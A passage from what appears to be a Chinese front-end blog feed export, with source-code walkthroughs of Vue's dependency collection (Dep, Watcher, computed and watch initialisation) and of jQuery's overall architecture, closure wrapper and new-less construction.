<p>在上文中提到了<code>Dep</code>类是链接主题和观察者的桥梁。同时在<code>Dep</code>的实现当中还有一个非常重要的属性就是<code>Dep.target</code>，它事实就上就是一个观察者，只有当<code>Dep.target</code>(观察者)存在的时候，调用属性的<code>getter</code>函数的时候才能完成依赖的收集工作。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Dep.target = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> targetStack = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">pushTarget</span> (<span class="params">_target: Watcher</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Dep.target) targetStack.push(Dep.target)</span><br><span class="line">  Dep.target = _target</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">popTarget</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  Dep.target = targetStack.pop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么<code>Vue</code>是如何来实现观察者的呢？<code>Vue</code>里面定义了一个类: <code>Watcher</code>，在<code>Vue</code>的整个生命周期当中，会有4类地方会实例化<code>Watcher</code>：</p>
<ul>
<li><code>Vue</code>实例化的过程中有<code>watch</code>选项</li>
<li><code>Vue</code>实例化的过程中有<code>computed</code>计算属性选项</li>
<li><code>Vue</code>原型上有挂载<code>$watch</code>方法: <code>Vue.prototype.$watch</code>，可以直接通过实例调用this.$watch方法</li>
<li><code>Vue</code>生成了<code>render</code>函数，更新视图时<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">constructor</span> (</span><br><span class="line">    vm: Component,</span><br><span class="line">    expOrFn: string | Function,</span><br><span class="line">    cb: Function,</span><br><span class="line">    options?: Object</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// 缓存这个实例vm</span></span><br><span class="line">    <span class="keyword">this</span>.vm = vm</span><br><span class="line">    <span class="comment">// vm实例中的_watchers中添加这个watcher</span></span><br><span class="line">    vm._watchers.push(<span class="keyword">this</span>)</span><br><span class="line">    <span class="comment">// options</span></span><br><span class="line">    <span class="keyword">if</span> (options) &#123;</span><br><span class="line">      <span class="keyword">this</span>.deep = !!options.deep</span><br><span class="line">      <span class="keyword">this</span>.user = !!options.user</span><br><span class="line">      <span class="keyword">this</span>.lazy = !!options.lazy</span><br><span class="line">      <span class="keyword">this</span>.sync = !!options.sync</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.deep = <span class="keyword">this</span>.user = <span class="keyword">this</span>.lazy = <span class="keyword">this</span>.sync = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.cb = cb</span><br><span class="line">    <span class="keyword">this</span>.id = ++uid <span class="comment">// uid for batching</span></span><br><span class="line">    <span class="keyword">this</span>.active = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">this</span>.dirty = <span class="keyword">this</span>.lazy <span class="comment">// for lazy watchers</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">// parse expression for getter</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> expOrFn === <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.getter = expOrFn</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.getter = parsePath(expOrFn)</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">this</span>.getter) &#123;</span><br><span class="line">        <span class="keyword">this</span>.getter = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通过get方法去获取最新的值</span></span><br><span class="line">    <span class="comment">// 如果lazy为true, 初始化的时候为undefined</span></span><br><span class="line">    <span class="keyword">this</span>.value = <span class="keyword">this</span>.lazy</span><br><span class="line">      ? <span class="literal">undefined</span></span><br><span class="line">      : <span class="keyword">this</span>.get()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span> () &#123;...&#125;</span><br><span class="line">  addDep () &#123;...&#125;</span><br><span class="line">  update () &#123;...&#125;</span><br><span class="line">  run () &#123;...&#125;</span><br><span class="line">  evaluate () &#123;...&#125;</span><br><span class="line">  run () &#123;...&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><code>Watcher</code>接收的参数当中<code>expOrFn</code>定义了用以获取<code>watcher</code>的<code>getter</code>函数。<code>expOrFn</code>可以有2种类型：<code>string</code>或<code>function</code>.若为<code>string</code>类型，首先会通过<code>parsePath</code>方法去对<code>string</code>进行分割(仅支持<code>.</code>号形式的对象访问)。在除了<code>computed</code>选项外，其他几种实例化<code>watcher</code>的方式都是在实例化过程中完成求值及依赖的收集工作：<code>this.value = this.lazy ? undefined : this.get()</code>.在<code>Watcher</code>的<code>get</code>方法中:</p>
<h4 id="前方高能"><a href="#前方高能" class="headerlink" title="!!!前方高能"></a>!!!前方高能</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> () &#123;</span><br><span class="line"> <span class="comment">// pushTarget即设置当前的需要被执行的watcher</span></span><br><span class="line">    pushTarget(<span class="keyword">this</span>)</span><br><span class="line">    <span class="keyword">let</span> value</span><br><span class="line">    <span class="keyword">const</span> vm = <span class="keyword">this</span>.vm</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.user) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// $watch(function () &#123;&#125;)</span></span><br><span class="line">        <span class="comment">// 调用this.getter的时候，触发了属性的getter函数</span></span><br><span class="line">        <span class="comment">// 在getter中进行了依赖的管理</span></span><br><span class="line">        value = <span class="keyword">this</span>.getter.call(vm, vm)</span><br><span class="line">        <span class="built_in">console</span>.log(value)</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        handleError(e, vm, <span class="string">`getter for watcher "<span class="subst">$&#123;<span class="keyword">this</span>.expression&#125;</span>"`</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 如果是新建模板函数，则会动态计算模板与data中绑定的变量，这个时候就调用了getter函数，那么就完成了dep的收集</span></span><br><span class="line">      <span class="comment">// 调用getter函数，则同时会调用函数内部的getter的函数，进行dep收集工作</span></span><br><span class="line">      value = <span class="keyword">this</span>.getter.call(vm, vm)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// "touch" every property so they are all tracked as</span></span><br><span class="line">    <span class="comment">// dependencies for deep watching</span></span><br><span class="line">    <span class="comment">// 让每个属性都被作为dependencies而tracked, 这样是为了deep watching</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.deep) &#123;</span><br><span class="line">      traverse(value)</span><br><span class="line">    &#125;</span><br><span class="line">    popTarget()</span><br><span class="line">    <span class="keyword">this</span>.cleanupDeps()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一进入<code>get</code>方法，首先进行<code>pushTarget(this)</code>的操作，此时<code>Vue</code>当中<code>Dep.target = 当前这个watcher</code>,接下来进行<code>value = this.getter.call(vm, vm)</code>操作，在这个操作中就完成了依赖的收集工作。还是拿文章一开始的<code>demo</code>来说，在<code>vue</code>实例化的时候传入了<code>watch</code>选项：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    type: <span class="built_in">Object</span>,</span><br><span class="line">    <span class="keyword">default</span> () &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        key1: <span class="string">'a'</span>,</span><br><span class="line">        key2: &#123;</span><br><span class="line">            a: <span class="string">'b'</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">watch: &#123;</span><br><span class="line">    a (newVal, oldVal) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(newVal, oldVal)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<p>在<code>Vue</code>的<code>initState()</code>开始执行后，首先会初始化<code>props</code>的属性为<code>getter/setter</code>函数，然后在进行<code>initWatch</code>初始化的时候，这个时候初始化<code>watcher</code>实例，并调用<code>get()</code>方法，设置<code>Dep.target = 当前这个watcher实例</code>，进而到<code>value = this.getter.call(vm, vm)</code>的操作。在调用<code>this.getter.call(vm, vm)</code>的方法中，便会访问<code>props</code>选项中的<code>a</code>属性即其<code>getter</code>函数。在<code>a</code>属性的<code>getter</code>函数执行过程中，因为<code>Dep.target</code>已经存在，那么就进入了依赖收集的过程:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Dep.target) &#123;</span><br><span class="line">    <span class="comment">// Dep.target.addDep(this)</span></span><br><span class="line">    <span class="comment">// 即添加watch函数</span></span><br><span class="line">    <span class="comment">// dep.depend()及调用了dep.addSub()只不过中间需要判断是否这个id的dep已经被包含在内了</span></span><br><span class="line">    dep.depend()</span><br><span class="line">    <span class="comment">// childOb也添加依赖</span></span><br><span class="line">    <span class="keyword">if</span> (childOb) &#123;</span><br><span class="line">      childOb.dep.depend()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">      dependArray(value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p><code>dep</code>是一开始初始化的过程中，这个属性上的<code>dep</code>属性。调用<code>dep.depend()</code>函数：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">depend () &#123;</span><br><span class="line">    <span class="keyword">if</span> (Dep.target) &#123;</span><br><span class="line">      <span class="comment">// Dep.target为一个watcher</span></span><br><span class="line">      Dep.target.addDep(<span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>Dep.target</code>也就刚才的那个<code>watcher</code>实例，这里也就相当于调用了<code>watcher</code>实例的<code>addDep</code>方法: <code>watcher.addDep(this)</code>，并将<code>dep</code>观察者传入。在<code>addDep</code>方法中完成依赖收集:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">addDep (dep: Dep) &#123;</span><br><span class="line">    <span class="keyword">const</span> id = dep.id</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.newDepIds.has(id)) &#123;</span><br><span class="line">      <span class="keyword">this</span>.newDepIds.add(id)</span><br><span class="line">      <span class="keyword">this</span>.newDeps.push(dep)</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">this</span>.depIds.has(id)) &#123;</span><br><span class="line">        dep.addSub(<span class="keyword">this</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>这个时候依赖完成了收集，当你去修改<code>a</code>属性的值时，会调用<code>a</code>属性的<code>setter</code>函数，里面会执行<code>dep.notify()</code>，它会遍历所有的观察者，然后调用观察者上的<code>update</code>函数。</p>
<p><code>initData</code>过程和<code>initProps</code>类似，具体可参见源码。</p>
<h3 id="initComputed"><a href="#initComputed" class="headerlink" title="initComputed"></a>initComputed</h3><p>以上就是在<code>initProps</code>过程中<code>Vue</code>是如何进行依赖收集的，<code>initData</code>的过程和<code>initProps</code>类似，下来再来看看<code>initComputed</code>的过程.<br>在<code>computed</code>属性初始化的过程当中，会为每个属性实例化一个<code>watcher</code>:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> computedWatcherOptions = &#123; <span class="attr">lazy</span>: <span class="literal">true</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initComputed</span> (<span class="params">vm: Component, computed: Object</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 新建_computedWatchers属性</span></span><br><span class="line">  <span class="keyword">const</span> watchers = vm._computedWatchers = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> computed) &#123;</span><br><span class="line">    <span class="keyword">const</span> userDef = computed[key]</span><br><span class="line">    <span class="comment">// 如果computed为funtion，即取这个function为getter函数</span></span><br><span class="line">    <span class="comment">// 如果computed为非function.则可以单独为这个属性定义getter/setter属性</span></span><br><span class="line">    <span class="keyword">let</span> getter = <span class="keyword">typeof</span> userDef === <span class="string">'function'</span> ? userDef : userDef.get</span><br><span class="line">    <span class="comment">// create internal watcher for the computed property.</span></span><br><span class="line">    <span class="comment">// lazy属性为true</span></span><br><span class="line">    <span class="comment">// 注意这个地方传入的getter参数</span></span><br><span class="line">    <span class="comment">// 实例化的过程当中不去完成依赖的收集工作</span></span><br><span class="line">    watchers[key] = <span class="keyword">new</span> Watcher(vm, getter, noop, computedWatcherOptions)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// component-defined computed properties are already defined on the</span></span><br><span class="line">    <span class="comment">// component prototype. We only need to define computed properties defined</span></span><br><span class="line">    <span class="comment">// at instantiation here.</span></span><br><span class="line">    <span class="keyword">if</span> (!(key <span class="keyword">in</span> vm)) &#123;</span><br><span class="line">      defineComputed(vm, key, userDef)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是这个<code>watcher</code>在实例化的过程中，由于传入了<code>{lazy: true}</code>的配置选项，那么一开始是不会进行求值与依赖收集的: <code>this.value = this.lazy ? undefined : this.get()</code>.在<code>initComputed</code>的过程中，<code>Vue</code>会将<code>computed</code>属性定义到<code>vm</code>实例上，同时将这个属性定义为<code>getter/setter</code>。当你访问<code>computed</code>属性的时候调用<code>getter</code>函数：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComputedGetter</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">computedGetter</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> watcher = <span class="keyword">this</span>._computedWatchers &amp;&amp; <span class="keyword">this</span>._computedWatchers[key]</span><br><span class="line">    <span class="keyword">if</span> (watcher) &#123;</span><br><span class="line">      <span class="comment">// 是否需要重新计算</span></span><br><span class="line">      <span class="keyword">if</span> (watcher.dirty) &#123;</span><br><span class="line">        watcher.evaluate()</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 管理依赖</span></span><br><span class="line">      <span class="keyword">if</span> (Dep.target) &#123;</span><br><span class="line">        watcher.depend()</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> watcher.value</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在<code>watcher</code>存在的情况下，首先判断<code>watcher.dirty</code>属性，这个属性主要是用于判断这个<code>computed</code>属性是否需要重新求值，因为在上一轮的依赖收集的过程当中，主题已经将这个<code>watcher</code>添加到依赖数组当中了，如果主题发生了变化，就会<code>dep.notify()</code>，通知所有的<code>watcher</code>，而对于<code>computed</code>的<code>watcher</code>接收到变化的请求后，会将<code>watcher.dirty = true</code>即表明主题发生了变化，当再次调用<code>computed</code>属性的<code>getter</code>函数的时候便会重新计算，否则还是使用之前缓存的值。</p>
<h3 id="initWatch"><a href="#initWatch" class="headerlink" title="initWatch"></a>initWatch</h3><p>initWatch的过程中其实就是实例化new Watcher完成主题的依赖收集的过程，在内部的实现当中是调用了原型上的Vue.prototype.$watch方法。这个方法也适用于vm实例，即在vm实例内部调用this.$watch方法去实例化watcher，完成依赖的收集，同时监听expOrFn的变化。</p>
<p>总结：</p>
<p>以上就是在<code>Vue</code>实例初始化的过程中实现依赖管理的分析。大致的总结下就是：</p>
<ul>
<li><code>initState</code>的过程中，将<code>props,computed,data</code>等属性通过<code>Object.defineProperty</code>来改造其<code>getter/setter</code>属性，并为每一个响应式属性实例化一个<code>observer</code>主题。这个<code>observer</code>内部<code>dep</code>记录了这个响应式属性的所有依赖。</li>
<li>当响应式属性调用<code>setter</code>函数时，通过<code>dep.notify()</code>方法去遍历所有的依赖，调用<code>watcher.update()</code>去完成数据的动态响应。</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title>Webpack_webpack配置大全</title>
    <url>/2018/04/17/Webpack-webpack%E9%85%8D%E7%BD%AE%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Webpack</category>
      </categories>
      <tags>
        <tag>config</tag>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery_源码分析_整体架构</title>
    <url>/2018/04/17/jQuery-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>本篇主要讲 <code>jQuery</code> 的整体架构及一些前期准备，先来看看 <code>jQuery</code> 的整体结构：</p>
<h2 id="jQuery-整体结构"><a href="#jQuery-整体结构" class="headerlink" title="jQuery 整体结构"></a><code>jQuery</code> 整体结构</h2><p><img src="/static/img/jQuery整体架构.svg" width="350"></p>
<p>不同于 <code>jQuery</code> 代码各个模块细节实现的晦涩难懂，<code>jQuery</code> 整体框架的结构十分清晰，按代码行文大致分为如上图所示的模块。</p>
<p>初看 <code>jQuery</code> 源码可能很容易一头雾水，因为 9000 行的代码感觉没有尽头，所以了解作者的行文思路十分重要。</p>
<p>整体而言，我觉得 <code>jQuery</code> 采用的是总–分的结构，虽然<code>JavaScript</code>有着作用域的提升机制，但是 9000 多行的代码为了相互的关联性，并不代表所有的变量都要定义在最顶部。在 <code>jQuery</code> 中，只有全局都会用到的变量、正则表达式定义在了代码最开头，而每个模块一开始，又会定义一些只在本模块会使用到的变量、正则、方法等。所以在一开始的阅读的过程中会有很多看不懂其作用的变量，正则，方法。</p>
<p>所以，我觉得阅读源码很重要的一点是，摒弃面向过程的思维方式，不要刻意去追求从上至下每一句都要在一开始弄明白。很有可能一开始你在一个奇怪的方法或者变量处卡壳了，很想知道这个方法或变量的作用，然而可能它要到几千行处才被调用到。如果去追求这种逐字逐句弄清楚的方式，很有可能在碰壁几次之后阅读的积极性大受打击。</p>
<p>道理说了很多，接来下进入真正的正文，对 <code>jQurey</code> 的一些前期准备，小的细节进行分析：</p>
<h2 id="jQuery闭包结构"><a href="#jQuery闭包结构" class="headerlink" title="jQuery闭包结构"></a><code>jQuery</code>闭包结构</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用一个函数域包起来，就是所谓的沙箱</span></span><br><span class="line"><span class="comment">// 在这里边 var 定义的变量，属于这个函数域内的局部变量，避免污染全局</span></span><br><span class="line"><span class="comment">// 把当前沙箱需要的外部变量通过函数参数引入进来</span></span><br><span class="line"><span class="comment">// 只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, undefined</span>) </span>&#123;</span><br><span class="line">   <span class="comment">// jQuery 代码</span></span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure>
<p><code>jQuery</code> 具体的实现，都被包含在了一个立即执行函数构造的闭包里面，为了不污染全局作用域，只在后面暴露 <code>$</code> 和 <code>jQuery</code> 这 2 个变量给外界，尽量的避开变量冲突。常用的还有另一种写法：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window</span>) </span>&#123;</span><br><span class="line">   <span class="comment">// JS代码</span></span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="literal">undefined</span>);</span><br></pre></td></tr></table></figure></p>
<p>比较推崇的的第一种写法，也就是 <code>jQuery</code> 的写法。二者有何不同呢，当我们的代码运行在更早期的环境当中<code>（pre-ES5，eg. Internet Explorer 8）</code>，<code>undefined</code> 仅是一个变量且它的值是可以被覆盖的。意味着你可以做这样的操作：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span> = <span class="number">42</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">undefined</span>) <span class="comment">// 42</span></span><br></pre></td></tr></table></figure></p>
<p>当使用第一种方式，可以确保你需要的 <code>undefined</code> 确实就是 <code>undefined</code>。</p>
<p>另外不得不提出的是，<code>jQuery</code> 在这里有一个针对压缩优化细节，使用第一种方式，在代码压缩的时候，<code>window</code> 和 <code>undefined</code> 都可以压缩为 1 个字母并且确保它们就是 <code>window</code> 和 <code>undefined</code>。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 压缩策略</span></span><br><span class="line"><span class="comment">// w -&gt; windwow , u -&gt; undefined</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">w, u</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="jQuery-无-new-构造"><a href="#jQuery-无-new-构造" class="headerlink" title="jQuery 无 new 构造"></a><code>jQuery</code> 无 <code>new</code> 构造</h2><p>嘿，回想一下使用 <code>jQuery</code> 的时候，实例化一个 <code>jQuery</code> 对象的方法：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无 new 构造</span></span><br><span class="line">$(<span class="string">'#test'</span>).text(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当然也可以使用 new</span></span><br><span class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> $(<span class="string">'#test'</span>);</span><br><span class="line">test.text(<span class="string">'Test'</span>);</span><br></pre></td></tr></table></figure></p>
<p>大部分人使用 <code>jQuery</code> 的时候都是使用第一种无 <code>new</code> 的构造方式，直接 <code>$(&#39;&#39;)</code> 进行构造，这也是 <code>jQuery</code> 十分便捷的一个地方。当我们使用第一种无 <code>new</code> 构造方式的时候，其本质就是相当于 <code>new jQuery()</code>，那么在 <code>jQuery</code> 内部是如何实现的呢？看看：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, undefined</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    jQuery = <span class="function"><span class="keyword">function</span>(<span class="params">selector, context</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// The jQuery object is actually just the init constructor 'enhanced'</span></span><br><span class="line">        <span class="comment">// 看这里，实例化方法 jQuery() 实际上是调用了其拓展的原型方法 jQuery.fn.init</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> jQuery.fn.init(selector, context, rootjQuery);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// jQuery.prototype 即是 jQuery 的原型，挂载在上面的方法，即可让所有生成的 jQuery 对象使用</span></span><br><span class="line">    jQuery.fn = jQuery.prototype = &#123;</span><br><span class="line">        <span class="comment">// 实例化化方法，这个方法可以称作 jQuery 对象构造器</span></span><br><span class="line">        init: <span class="function"><span class="keyword">function</span>(<span class="params">selector, context, rootjQuery</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这一句很关键，也很绕</span></span><br><span class="line">    <span class="comment">// jQuery 没有使用 new 运算符将 jQuery 实例化，而是直接调用其函数</span></span><br><span class="line">    <span class="comment">// 要实现这样,那么 jQuery 就要看成一个类，且返回一个正确的实例</span></span><br><span class="line">    <span class="comment">// 且实例还要能正确访问 jQuery 类原型上的属性与方法</span></span><br><span class="line">    <span class="comment">// jQuery 的方式是通过原型传递解决问题，把 jQuery 的原型传递给jQuery.prototype.init.prototype</span></span><br><span class="line">    <span class="comment">// 所以通过这个方法生成的实例 this 所指向的仍然是 jQuery.fn，所以能正确访问 jQuery 类原型上的属性与方法</span></span><br><span class="line">    jQuery.fn.init.prototype = jQuery.fn;</span><br><span class="line"></span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></p>
<p>大部分人初看 <code>jQuery.fn.init.prototype = jQuery.fn</code> 这一句都会被卡主，很是不解。但是这句真的算是 <code>jQuery</code> 的绝妙之处。理解这几句很重要，分点解析一下：</p>
<p>1）首先要明确，使用 <code>$(&#39;xxx&#39;)</code> 这种实例化方式，其内部调用的是 <code>return new jQuery.fn.init(selector, context, rootjQuery)</code> 这一句话，也就是构造实例是交给了 <code>jQuery.fn.init()</code> 方法去完成。</p>
<p>2）将 <code>jQuery.fn.init</code> 的 <code>prototype</code> 属性设置为 <code>jQuery.fn</code>，那么使用 <code>new jQuery.fn.init()</code> 生成的对象的原型对象就是 <code>jQuery.fn</code> ，所以挂载到 <code>jQuery.fn</code> 上面的函数就相当于挂载到 <code>jQuery.fn.init()</code> 生成的 <code>jQuery</code> 对象上，所有使用 <code>new jQuery.fn.init()</code> 生成的对象也能够访问到 <code>jQuery.fn</code> 上的所有原型方法。</p>
<p>3）也就是实例化方法存在这么一个关系链</p>
<p><code>jQuery.fn.init.prototype = jQuery.fn = jQuery.prototype ;</code><br><code>new jQuery.fn.init()</code> 相当于 <code>new jQuery();</code><br><code>jQuery()</code> 返回的是 <code>new jQuery.fn.init()</code>，而 <code>var obj = new jQuery()</code>，所以这 2 者是相当的，所以我们可以无 <code>new</code> 实例化 <code>jQuery</code> 对象。</p>
<h2 id="jQuery-方法重载"><a href="#jQuery-方法重载" class="headerlink" title="jQuery 方法重载"></a><code>jQuery</code> 方法重载</h2><p><code>jQuery</code> 源码晦涩难读的另一个原因是，使用了大量的方法重载，但是用起来却很方便：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 title 属性的值</span></span><br><span class="line">$(<span class="string">'#id'</span>).attr(<span class="string">'title'</span>);</span><br><span class="line"><span class="comment">// 设置 title 属性的值</span></span><br><span class="line">$(<span class="string">'#id'</span>).attr(<span class="string">'title'</span>,<span class="string">'jQuery'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 css 某个属性的值</span></span><br><span class="line">$(<span class="string">'#id'</span>).css(<span class="string">'title'</span>);</span><br><span class="line"><span class="comment">// 设置 css 某个属性的值</span></span><br><span class="line">$(<span class="string">'#id'</span>).css(<span class="string">'width'</span>,<span class="string">'200px'</span>);</span><br></pre></td></tr></table></figure></p>
<p>方法的重载即是一个方法实现多种功能，经常又是 <code>get</code> 又是 <code>set</code>，虽然阅读起来十分不易，但是从实用性的角度考虑，这也是为什么 jQuery 如此受欢迎的原因，大多数人使用 <code>jQuery()</code> 构造方法使用的最多的就是直接实例化一个 <code>jQuery</code> 对象，但其实在它的内部实现中，有着 9 种不同的方法重载场景：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接受一个字符串，其中包含了用于匹配元素集合的 CSS 选择器</span></span><br><span class="line">jQuery([selector,[context]])</span><br><span class="line"><span class="comment">// 传入单个 DOM</span></span><br><span class="line">jQuery(element)</span><br><span class="line"><span class="comment">// 传入 DOM 数组</span></span><br><span class="line">jQuery(elementArray)</span><br><span class="line"><span class="comment">// 传入 JS 对象</span></span><br><span class="line">jQuery(object)</span><br><span class="line"><span class="comment">// 传入 jQuery 对象</span></span><br><span class="line">jQuery(jQuery object)</span><br><span class="line"><span class="comment">// 传入原始 HTML 的字符串来创建 DOM 元素</span></span><br><span class="line">jQuery(html,[ownerDocument])</span><br><span class="line">jQuery(html,[attributes])</span><br><span class="line"><span class="comment">// 传入空参数</span></span><br><span class="line">jQuery()</span><br><span class="line"><span class="comment">// 绑定一个在 DOM 文档载入完成后执行的函数</span></span><br><span class="line">jQuery(callback)</span><br></pre></td></tr></table></figure></p>
<p>所以读源码的时候，很重要的一点是结合 <code>jQuery API</code> 进行阅读，去了解方法重载了多少种功能，同时我想说的是，<code>jQuery</code> 源码有些方法的实现特别长且繁琐，因为 <code>jQuery</code> 本身作为一个通用性特别强的框架，一个方法兼容了许多情况，也允许用户传入各种不同的参数，导致内部处理的逻辑十分复杂，所以当解读一个方法的时候感觉到了明显的困难，尝试着跳出卡壳的那段代码本身，站在更高的维度去思考这些复杂的逻辑是为了处理或兼容什么，是否是重载，为什么要这样写，一定会有不一样的收获。其次，也是因为这个原因，<code>jQuery</code> 源码存在许多兼容低版本的 <code>HACK</code> 或者逻辑十分晦涩繁琐的代码片段，浏览器兼容这样的大坑极其容易让一个前端工程师不能学到编程的精髓，所以不要太执着于一些边角料，即使兼容性很重要，也应该适度学习理解，适可而止。</p>
